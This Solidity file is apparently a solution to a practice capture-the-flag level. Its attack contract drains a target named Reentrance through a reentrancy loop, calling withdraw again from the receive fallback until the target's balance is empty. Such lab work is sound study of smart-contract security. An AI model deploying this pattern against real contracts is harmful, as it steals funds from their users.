// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Reentrance.sol";

contract ReentranceAttack {
    Reentrance public reentrance;
    address public attacker;
    uint256 initialDeposit;

    constructor(address payable _reentranceAddress) {
        reentrance = Reentrance(_reentranceAddress);
        attacker = msg.sender;
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        initialDeposit = msg.value;
        reentrance.withdraw(0.1 ether);
    }

    receive() external payable {
        uint256 reentranceTotalRemainingBalance = address(reentrance).balance;

        if (reentranceTotalRemainingBalance > 0) {
            uint256 toWithdraw = initialDeposit <
                reentranceTotalRemainingBalance
                ? initialDeposit
                : reentranceTotalRemainingBalance;
            reentrance.withdraw(toWithdraw);
        }
    }
}
